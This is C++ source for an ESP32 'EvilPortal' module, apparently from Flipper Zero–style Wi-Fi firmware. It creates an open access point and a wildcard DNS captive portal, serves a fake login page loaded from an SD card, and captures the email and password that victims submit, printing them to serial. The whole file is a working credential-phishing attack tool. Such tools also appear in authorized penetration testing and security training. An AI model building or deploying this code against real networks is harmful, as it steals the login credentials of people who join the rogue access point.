#include "EvilPortal.h"

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;
}

void EvilPortal::begin() {
  // wait for init flipper input
  this->setAP();
  this->setHtml();

  startPortal();
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", this->index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
      Serial.println(this->user_name);
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
      Serial.println(this->password);
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

void EvilPortal::setHtml() {
  Serial.println("Setting HTML...");
  File html_file = sd_obj.getFile("/index.html");
  if (!html_file) {
    Serial.println("Could not open index.html. Exiting...");
    return;
  }
  else {
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    strncpy(this->index_html, html.c_str(), strlen(html.c_str()));
    this->has_html = true;
    Serial.println("html set");
    html_file.close();    
  }
}

void EvilPortal::setAP() {
  File ap_config_file = sd_obj.getFile("/ap.config.txt");
  if (!ap_config_file) {
    Serial.println("Could not open ap.config.txt. Exiting...");
    return;
  }
  else {
    String ap_config = "";
    while (ap_config_file.available()) {
      char c = ap_config_file.read();
      Serial.print(c);
      if (isPrintable(c))
        ap_config.concat(c);
    }
    strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
    this->has_ap = true;
    Serial.println("ap config set");
    ap_config_file.close();
  }
}

void EvilPortal::startAP() {
  Serial.print("starting ap ");
  Serial.println(this->apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(this->apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode == WIFI_SCAN_EVIL_PORTAL) {
    this->dnsServer.processNextRequest();
    if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      String logValue1 =
          "u: " + this->user_name;
      String logValue2 = "p: " + this->password;
      Serial.println(logValue1);
      Serial.println(logValue2);
    }
  }
}